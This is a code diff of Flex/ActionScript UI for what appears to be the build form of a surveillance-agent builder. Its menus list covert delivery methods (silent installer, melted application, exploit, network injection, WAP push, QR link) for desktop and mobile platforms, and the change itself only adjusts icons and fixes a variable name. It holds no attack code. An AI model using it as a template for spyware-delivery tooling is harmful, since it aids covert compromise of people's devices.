@@ -28,28 +28,28 @@
       [Bindable]
       private var treeData_desktop:XMLList =
         <>
-          <node folder='true' label="Silent Installer" state="none" icon="desktopIcon">
+          <node folder='true' label="Silent Installer" state="none" >
             <node label="OSX" state='dsk_silent' desc='BUILD_SILENT' icon="osxIcon"/>
             <node label="Windows" state='dsk_silent' desc='BUILD_SILENT' icon="windowsIcon"/>
           </node>
-          <node folder='true' label="Melted Application" state="none" icon="desktopIcon">
+          <node folder='true' label="Melted Application" state="none" >
             <node label="OSX" state='dsk_melted' desc='BUILD_MELTED' icon="osxIcon"/>
             <node label="Windows" state='dsk_melted' desc='BUILD_MELTED' icon="windowsIcon"/>
           </node>
-          <node folder='true' label="U3 Installation" state="none" icon="desktopIcon">
+          <node folder='true' label="U3 Installation" state="none" >
             <node label="Windows" state='dsk_U3' desc='BUILD_U3' icon="windowsIcon"/>
           </node>
-          <node folder='true' label="Applet Web" state="none" icon="desktopIcon">
-            <node label="Multi-Platform" state='dsk_applet' desc='BUILD_APPLET'/>
+          <node folder='true' label="Applet Web" state="none">
+            <node label="Multi-Platform" state='dsk_applet' desc='BUILD_APPLET' icon="desktopIcon"/>
           </node>
-          <node folder='true' label="Offline Installation" state="none" icon="desktopIcon">
-            <node label="Multi-Platform" state='dsk_offline' desc='BUILD_OFFLINE'/>
+          <node folder='true' label="Offline Installation" state="none">
+            <node label="Multi-Platform" state='dsk_offline' desc='BUILD_OFFLINE' icon="desktopIcon"/>
           </node>            
-          <node folder='true' label="Exploit" state="none" icon="desktopIcon">
+          <node folder='true' label="Exploit" state="none" >
             <node label="OSX" state='exploit' desc='BUILD_EXPLOIT' icon="osxIcon"/>
             <node label="Windows" state='exploit' desc='BUILD_EXPLOIT' icon="windowsIcon"/>
           </node>
-          <node folder='true' label="Network Injection" state="none" icon="desktopIcon">
+          <node folder='true' label="Network Injection" state="none" >
             <node label="OSX" state='dsk_nia' desc='BUILD_NIA' icon="osxIcon"/>
             <node label="Windows" state='dsk_nia' desc='BUILD_NIA' icon="windowsIcon"/>
           </node>
@@ -73,14 +73,14 @@
             <node label="WinMo" state='mob_melted' desc='BUILD_MELTED' icon="winMoIcon"/>
           </node>
           <node folder='true' label="Wap Push Message" state="none">
-            <node label="MultiPlatform" state='mob_wap' desc='BUILD_WAP'/>
+            <node label="MultiPlatform" state='mob_wap' desc='BUILD_WAP' icon="mobileIcon" />
             <node label="Android" state='mob_wap' desc='BUILD_WAP' icon="androidIcon"/>
             <node label="Blackberry" state='mob_wap' desc='BUILD_WAP' icon="blackberryIcon"/>
             <node label="Symbian" state='mob_wap' desc='BUILD_WAP' icon="symbianIcon"/>
             <node label="WinMo" state='mob_wap' desc='BUILD_WAP' icon="winMoIcon"/>
           </node>
           <node folder='true' label="QR Code / Web Link" state="none">
-            <node label="MultiPlatform" state='mob_qr' desc='BUILD_QR'/>
+            <node label="MultiPlatform" state='mob_qr' desc='BUILD_QR' icon="mobileIcon"/>
             <node label="Android" state='mob_qr' desc='BUILD_QR' icon="androidIcon"/>
             <node label="Blackberry" state='mob_qr' desc='BUILD_QR' icon="blackberryIcon"/>
             <node label="Symbian" state='mob_qr' desc='BUILD_QR' icon="symbianIcon"/>
@@ -121,11 +121,19 @@
       
       [Bindable]
       [Embed('/img/buildform/agent_desktop_16.png')]
-      public var dektopIcon:Class;
+      public var desktopIcon:Class;
       
       [Bindable]
       [Embed('/img/buildform/agent_mobile_16.png')]
       public var mobileIcon:Class;
+      
+      [Bindable]
+      [Embed('/img/buildform/openFolder.gif')]
+      public var openFolderIcon:Class;
+      
+      [Bindable]
+      [Embed('/img/buildform/closedFolder.gif')]
+      public var closedFolderIcon:Class;
       
       protected function close(event:*):void
       { 
@@ -203,7 +211,7 @@
            change="vectorTree_changeHandler(event)"
            dataDescriptor="{new FilteredTreeDataDescriptor(filterFunc)}"
            dataProvider="{factory.type == 'desktop' ? treeData_desktop : treeData_mobile}"
-           labelField="@label" iconField="@icon" folderClosedIcon="{factory.type == 'desktop' ? dektopIcon : mobileIcon}" folderOpenIcon="{factory.type == 'desktop' ? dektopIcon : mobileIcon}"/>
+           labelField="@label" iconField="@icon" folderClosedIcon="{closedFolderIcon}" folderOpenIcon="{openFolderIcon}"/>
   
   <build:LeftPanel id="leftPanel" left="220" right="10" top="35" bottom="10" factory="{factory}"/>
     
